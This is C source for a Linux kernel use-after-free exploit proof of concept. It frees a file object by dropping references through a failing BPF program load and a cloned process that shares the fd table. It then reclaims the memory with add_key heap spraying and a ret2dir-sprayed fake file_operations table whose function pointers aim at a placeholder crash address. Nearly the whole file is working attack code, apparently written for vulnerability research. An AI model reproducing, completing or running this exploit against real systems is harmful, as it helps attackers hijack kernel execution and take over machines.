#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/bpf.h>
#include <assert.h>
#include "libexp.h"

#define USER_ADDR 0x20000
#define CRASH_IP 0xffffffffdeadbeef

int uaf_fd;
volatile int exit_flag = 0;
char payload[0x100-0x18];
u64 fake_ops[0x80/8];
void *kaddr;

int subproc_func(void *p) {
	prctl(PR_SET_PDEATHSIG, SIGKILL);
	sleep(100000);
}

u64 _get_mem_size(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char *line_buf = NULL;
	char *buf;
	size_t n;

	assert(f != NULL);

	if(getline(&line_buf, &n, f) < 0) {
		free(line_buf);
		goto out;
	}
	buf = strstr(line_buf, ":") + 1;
	fclose(f);
	return atoll(buf) * 1024;

out:
	puts("fail to read memory size");
	fclose(f);
	return -1;
}

void dec_refcount(void)
{
	struct bpf_insn insns[2] = {
		{
			.code = BPF_LD | BPF_IMM | BPF_DW,
			.src_reg = BPF_PSEUDO_MAP_FD,
			.imm = uaf_fd
		},
		{}
	};

	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = 2,
		.insns = (__aligned_u64) insns,
		.license = (__aligned_u64)""
	};
	if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
		errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
	if (errno != EINVAL)
		err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
}

void context_setup(void)
{
	// close all fd so that when the subprocess exits, only the uaf_fd will be closed
	for(int i=0; i<1000; i++) {
		if(i != 1) close(i);
	}

	/* step 1: open writable UAF fd*/
	uaf_fd = open("/dev/null", O_WRONLY | O_CLOEXEC);
	if(uaf_fd < 0) err(1, "unable to open UAF fd");
	/* refcount is now 1 */

	/* step 2: create a subprocess that shares the fd table */
	char *child_stack = malloc(8000);
	int child = clone(subproc_func, child_stack + 8000, CLONE_FILES | CLONE_VM | SIGCHLD, NULL);
	if (child == -1)
		err(1, "clone");
	/* refcount is now 2 */
}

void payload_setup(void)
{
	// prepare fake file_ops
	fake_ops[1] = CRASH_IP;
	fake_ops[0x70/8] = CRASH_IP;

	// use ret2dir to spray the fake fops
	u64 upper_limit = _get_mem_size() & (~0xfff);
	u64 kaddr = 0xffff880000000000 + upper_limit/4*3;
	kaddr &= 0xfffffffffffff000;
	for(int i=0;i<upper_limit/0x1000/4;i++) {
		void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
		memcpy(addr, fake_ops, sizeof(payload));
	}

	// prepare fake file
	long *ptr = (long *)(payload+6);
	memset(payload, 0x4, sizeof(payload));
	ptr[2] = kaddr;
	// void *ret = mmap((void *)USER_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
	// if(ret != (void *)USER_ADDR) error_out("fail to mmap");
	// ptr = (long *)(USER_ADDR + 0x8);
	// *ptr = CRASH_IP;
	// ptr = (long *)(USER_ADDR + 0x70);
	// *ptr = CRASH_IP;
}

void trigger(void)
{
	/* step 3: use BPF to remove one reference */
	dec_refcount();

	/* step 4: kill the subprocess to remove one more reference */
	exit_flag = 1;
}

// perfrom exploit once
void exploit(void) {
	context_setup();
	trigger();
	usleep(10000);// wait for the free to happen

	add_key_spray_num(payload, sizeof(payload), 0x400);
	//lseek(uaf_fd, 0, SEEK_SET);
	close(uaf_fd);
}

int main(void) {
	payload_setup();
	while(1) {
		usleep(10);
		if(!clean_fork()) {
			exploit();
			exit(0);
		}
		wait(NULL);
	}
}
